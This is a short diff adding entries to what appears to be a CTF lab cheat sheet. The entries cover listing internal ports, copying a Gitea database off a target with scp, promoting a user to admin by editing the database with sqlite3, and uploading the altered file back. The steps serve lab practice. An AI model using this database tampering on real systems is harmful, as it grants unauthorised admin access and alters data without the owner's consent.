@@ -160,3 +160,33 @@ curl "url_to_the_file" -o output.file
 ```shell
 sudo echo "10.10.59.31 subdomain.adana.thm" | sudo tee -a /etc/hosts
 ```
+
+- Find open ports internally:
+
+```shell
+ss -tulwn
+```
+
+- Download a file from attacker's machine using `scp`:
+
+```shell
+scp USER@MACHINE-IP:/gitea/gitea/gitea.db /tmp/gitea.db
+```
+
+- If you find a `.db` try to enter to it by:
+
+```shell
+sqlite3 file.db
+# The you can do
+select * from user;
+select lower_name, is_admin from user;
+# Update the admin of a new user
+UPDATE user SET is_admin=1 WHERE lower_name="<username>";
+.quit #exit the database
+```
+
+- Upload the modified database:
+
+```shell
+scp /tmp/gitea.db USER@MACHINE-IP:/gitea/gitea/gitea.db
+```
